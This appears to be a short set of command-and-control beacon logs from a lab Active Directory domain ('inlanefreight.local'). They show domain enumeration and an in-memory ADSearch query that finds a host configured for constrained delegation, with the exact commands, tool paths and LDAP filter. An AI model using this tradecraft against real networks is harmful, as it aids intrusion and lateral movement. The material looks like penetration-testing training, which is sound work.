












```python
[04/13 14:20:35] beacon> powershell Get-Domain
[04/13 14:20:35] [*] Tasked beacon to run: Get-Domain
[04/13 14:20:36] [+] host called home, sent: 297 bytes
[04/13 14:20:37] [+] received output:
#< CLIXML


Forest                  : inlanefreight.local
DomainControllers       : {DC02.inlanefreight.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC02.inlanefreight.local
RidRoleOwner            : DC02.inlanefreight.local
InfrastructureRoleOwner : DC02.inlanefreight.local
Name                    : inlanefreight.local



[04/13 14:21:05] [+] received output:
S-1-5-21-831407601-1803900599-2479021482
```



```python
[04/13 11:41:52] beacon> inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/ADSearch.exe --assemblyargs  --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
[04/13 11:41:52] [*] Running inlineExecute-Assembly by (@anthemtotheego)
[04/13 11:41:54] [+] host called home, sent: 390009 bytes
[04/13 11:41:56] [+] received output:



    ___    ____  _____                      __  
   /   |  / __ \/ ___/___  ____ ___________/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /  / /__/ / / /
/_/  |_/_____//____/\___/\__,_/_/   \___/_/ /_/  
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=INLANEFREIGHT,DC=LOCAL
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "DMZ01.INLANEFREIGHT.LOCAL",
    "samaccountname": "DMZ01$",
    "msds-allowedtodelegateto": [
      "www/WS01.INLANEFREIGHT.LOCAL",
      "www/WS01"
    ]
  }
]
```



```

```